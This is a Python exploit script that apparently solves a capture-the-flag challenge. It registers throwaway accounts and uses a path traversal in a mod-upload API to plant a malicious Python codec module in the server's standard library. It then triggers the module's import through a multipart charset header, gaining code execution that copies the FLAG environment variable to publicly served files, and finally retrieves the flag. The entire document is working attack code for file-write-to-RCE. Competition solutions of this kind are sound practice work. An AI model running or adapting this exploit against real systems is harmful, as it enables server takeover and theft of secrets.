#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

OUT = "flag_rce_" + secrets.token_hex(4) + ".txt"

SHIM = f"""import os, codecs

try:
    with open('/usr/share/nginx/html/{OUT}', 'w') as f:
        f.write(os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass

try:
    with open('/data/media/{OUT}', 'w') as f:
        f.write(os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass

class Codec(codecs.Codec):
    def encode(self, input, errors='strict'):
        return codecs.charmap_encode(input, errors, encoding_table)
    def decode(self, input, errors='strict'):
        return codecs.charmap_decode(input, errors, decoding_table)

class IncrementalEncoder(codecs.IncrementalEncoder):
    def encode(self, input, final=False):
        return codecs.charmap_encode(input, self.errors, encoding_table)[0]

class IncrementalDecoder(codecs.IncrementalDecoder):
    def decode(self, input, final=False):
        return codecs.charmap_decode(input, self.errors, decoding_table)[0]

class StreamWriter(Codec, codecs.StreamWriter):
    pass

class StreamReader(Codec, codecs.StreamReader):
    pass

def getregentry():
    return codecs.CodecInfo(
        name='iso8859_2',
        encode=Codec().encode,
        decode=Codec().decode,
        incrementalencoder=IncrementalEncoder,
        incrementaldecoder=IncrementalDecoder,
        streamreader=StreamReader,
        streamwriter=StreamWriter,
    )

decoding_table = tuple(chr(i) for i in range(256))
encoding_table = codecs.charmap_build(decoding_table)
"""

print(f"[*] Flag output filename: {OUT}")

# STEP 1: Plant payload into /usr/local/lib/python3.11/encodings/iso8859_2.py
# mod_version = "/usr/local/lib" (14 chars <= 20)
# platform_code = "python3.11/encodings" (20 chars <= 20)
# storage_dir = Path('/data/media/builds') / '/usr/local/lib' / 'python3.11/encodings'
#             = /usr/local/lib/python3.11/encodings
tok1, u1 = fresh()
pid = get_or_create_plat(tok1, "python3.11/encodings")
mid = requests.post(f"{BASE}/api/mods/", headers=H(tok1),
    json={"title":"z", "mod_version":"/usr/local/lib", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
bid = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok1),
    json={"platform": pid}, timeout=15).json()["id"]

bio = io.BytesIO()
with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
    # Use UTF-8 filename to prevent importing unneeded codecs during upload
    zf.writestr("é/iso8859_2.py", SHIM)
    zf.writestr("é/iso8859_3.py", SHIM.replace("iso8859_2", "iso8859_3"))
    zf.writestr("é/koi8_r.py", SHIM.replace("iso8859_2", "koi8_r"))
    zf.writestr("é/big5.py", SHIM.replace("iso8859_2", "big5"))
bio.seek(0)

r_upload = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok1),
    files={"zip_file": ("exploit.zip", bio, "application/zip")}, timeout=30)
print(f"[*] Plant status: {r_upload.status_code} (500 is normal because relative_to raises ValueError after file write)")

# STEP 2: Trigger import of encodings.iso8859_2 via multipart request with charset parameter
print("[*] Sending multipart request with charset=iso8859_2...")
tok2, u2 = fresh()

body = b'--boundary\r\nContent-Disposition: form-data; name="test"\r\n\r\nhello\r\n--boundary--\r\n'
headers = {
    "Authorization": f"Bearer {tok2}",
    "Content-Type": "multipart/form-data; boundary=boundary; charset=iso8859_2"
}

r_trig = requests.post(f"{BASE}/api/mods/", data=body, headers=headers, timeout=15)
print(f"[*] Trigger response (iso8859_2): {r_trig.status_code}")

# Also trigger iso8859_3 and koi8_r
headers["Content-Type"] = "multipart/form-data; boundary=boundary; charset=iso8859_3"
requests.post(f"{BASE}/api/mods/", data=body, headers=headers, timeout=15)

headers["Content-Type"] = "multipart/form-data; boundary=boundary; charset=koi8_r"
requests.post(f"{BASE}/api/mods/", data=body, headers=headers, timeout=15)

time.sleep(1)

# STEP 3: Retrieve Flag
print(f"\n[*] Fetching flag...")
for url, label in [(f"{BASE}/{OUT}", "nginx /"), (f"{BASE}/media/{OUT}", "media /media/")]:
    rf = requests.get(url, timeout=10)
    print(f"  [{label}] status {rf.status_code}: {rf.text[:100] if rf.ok else ''}")
    m = re.search(r"PTITCTF\{[^}]+\}", rf.text)
    if m:
        print(f"\n==========================================")
        print(f">>> FLAG FOUND: {m.group(0)}")
        print(f"==========================================")
        with open("final_flag.txt", "w") as f:
            f.write(m.group(0) + "\n")
        sys.exit(0)
